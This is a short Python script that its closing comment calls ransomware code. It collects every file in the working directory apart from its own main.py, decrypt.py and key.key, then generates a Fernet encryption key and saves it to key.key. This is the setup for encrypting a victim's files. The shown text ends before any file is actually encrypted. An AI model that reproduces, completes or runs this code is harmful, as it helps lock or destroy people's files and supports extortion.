from colorama import Fore,Style,init
from cryptography.fernet import Fernet
import os

files = []

for file in os.listdir():
    if(file == "main.py" or file == "decrypt.py" or file == "key.key"):
        continue
    else:
        if(os.path.isfile(file)):
            files.append(file)
        else:
            print(f"Can't append {file}")

print(files)

key = Fernet.generate_key()
with open("./key.key","wb") as keyFile:
    keyFile.write(key)

#This is an ransomware code in python